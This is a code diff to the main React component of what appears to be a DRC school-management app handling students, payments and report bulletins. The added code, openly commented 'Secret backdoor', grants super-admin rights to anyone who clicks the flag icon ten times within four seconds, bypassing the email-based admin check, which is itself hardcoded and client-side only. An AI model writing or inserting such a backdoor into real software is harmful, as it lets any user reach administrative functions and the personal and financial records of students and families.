@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { User, School, Student, Payment, Bulletin, UserRole, ArchivedFile, UserActivity } from './types';
 import { INITIAL_SCHOOLS, INITIAL_STUDENTS, INITIAL_PAYMENTS, INITIAL_BULLETINS } from './constants';
 import { PatrioticBackground, CongoFlagIcon, CongoCoatOfArms } from './components/CongoTheme';
@@ -213,6 +213,30 @@ export default function App() {
   const [isScannerOpen, setIsScannerOpen] = useState(false);
   const [scanCode, setScanCode] = useState('');
 
+  // Secret backdoor 10 clicks on flag to unlock admin space
+  const [forcedSuperAdmin, setForcedSuperAdmin] = useState(false);
+  const [flagClicks, setFlagClicks] = useState(0);
+  const flagClickTimeoutRef = useRef<any>(null);
+
+  const handleFlagClick = () => {
+    if (flagClickTimeoutRef.current) {
+      clearTimeout(flagClickTimeoutRef.current);
+    }
+    flagClickTimeoutRef.current = setTimeout(() => {
+      setFlagClicks(0);
+    }, 4000);
+
+    setFlagClicks(prev => {
+      const next = prev + 1;
+      if (next >= 10) {
+        setForcedSuperAdmin(true);
+        setActiveTab('ADMIN');
+        return 0; // Reset
+      }
+      return next;
+    });
+  };
+
   // States for supervisor central base view
   const [supervisorsTab, setSupervisorsTab] = useState<'SCHOOLS' | 'USERS'>('SCHOOLS');
   const [supervisorSchoolSearch, setSupervisorSchoolSearch] = useState('');
@@ -365,7 +389,7 @@ export default function App() {
   };
 
   const currentSchool = schools.find(s => s.id === activeSchoolId) || schools[0] || INITIAL_SCHOOLS[0];
-  const isSuperAdmin = currentUser?.email === 'birekeidea@gmail.com' || currentUser?.email === 'birekeidea@gmail';
+  const isSuperAdmin = currentUser?.email === 'birekeidea@gmail.com' || currentUser?.email === 'birekeidea@gmail' || forcedSuperAdmin;
 
   // Global Workspace statistics computed dynamically from records matching the active school identifier
   const schoolStudents = students.filter(s => s.schoolId === currentSchool.id);
@@ -396,8 +420,17 @@ export default function App() {
         <header className="bg-white/95 backdrop-blur-md rounded-2xl border border-slate-205 p-4 mb-6 shadow-sm flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
           
           <div className="flex items-center gap-3">
-            <span className="p-2.5 bg-sky-50 text-[#007FFF] rounded-xl border border-sky-100 shrink-0">
+            <span 
+              onClick={handleFlagClick} 
+              className="p-2.5 bg-sky-50 text-[#007FFF] rounded-xl border border-sky-100 shrink-0 cursor-pointer hover:scale-105 active:scale-95 transition-all duration-150 relative inline-block"
+              title="Drapeau RDC (10 clics pour l'Espace Administrative/Portail d'Entente)"
+            >
                <CongoFlagIcon className="w-9 h-5 rounded-xs" />
+               {flagClicks > 0 && (
+                 <span className="absolute -top-1 -right-1 bg-red-650 text-white font-mono text-[8px] font-black w-4 h-4 rounded-full flex items-center justify-center border border-white animate-pulse">
+                   {flagClicks}
+                 </span>
+               )}
             </span>
             <div>
               <div className="flex items-center gap-1.5 flex-wrap">
